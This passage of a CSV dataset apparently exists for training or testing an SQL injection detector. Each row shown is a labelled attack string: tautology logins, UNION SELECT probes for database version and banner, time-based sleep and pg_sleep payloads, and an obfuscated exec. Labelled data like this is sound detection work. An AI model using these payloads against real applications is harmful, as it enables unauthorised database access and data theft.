row_index,payload_norm,label,sqli_type_hint
360,"select * from users where id = 1 or "" ( ["" or 1 = 1 -- 1",1,
361,UNION ALL SELECT,1,
362,"select * from users where id = 1 or ""1#"" or 1 = 1 -- 1",1,
363,select * from users where id = 1 or \<1 or 1 = 1 -- 1,1,
364,"select * from users where id = 1 | |1 union select 1,banner from v$version where rownum = 1 -- 1",1,
365,x' or full_name like '%bob%,1,
366,x' and members.email is NULL; --,1,
367,or 2 > 1,1,
368,select * from users where id = 1.*1 or 1 = 1 -- 1,1,
369,""" ) or pg_sleep ( __TIME__ ) --",1,
370,"select * from users where id = 1 or $<\. union select 1,@@VERSION -- 1",1,
371,"select * from users where id = 1 or ""@ ) "" or 1 = 1 -- 1",1,
372,select * from users where id = 1 or \.<$ or 1 = 1 -- 1,1,
373,) or sleep ( __TIME__ ) = ',1,
374,sleep 50',1,
375,"select * from users where id = '1' + 1||1 union select 1,banner from v$version where rownum = 1 -- 1'",1,
376,select * from users where id = 1 + $+%\ or 1 = 1 -- 1,1,
377,"select * from users where id = 1 or ""; ( "" or 1 = 1 -- 1",1,
378,or sleep ( __TIME__ ) = ',1,
379,"select * from users where id = 1 or "";_"" or 1 = 1 -- 1",1,
380,"select * from users where id = 1 or 1#"". union select 1,version ( ) -- 1",1,
381,"select * from users where id = 1 union select @ $,version ( ) -- 1",1,
382,"select * from users where id = 1 union select +!<@,version ( ) -- 1",1,
383,"select * from users where id = 1 <@<@ union select null,version ( ) -- 1",1,
384,; exec ( 'sel' + 'ect us' + 'er' ),1,
385,anything' OR 'x' = 'x,1,
386,"select * from users where id = 1 or \<\ union select 1,@@VERSION -- 1",1,
387,"select * from users where id = 1 union select ( 1 ) ,banner from v$version where rownum = 1 -- 1",1,
388,"select * from users where id = 1 * ( \ ) union select null,@@VERSION -- 1",1,
389,a' or 3 = 3--,1,
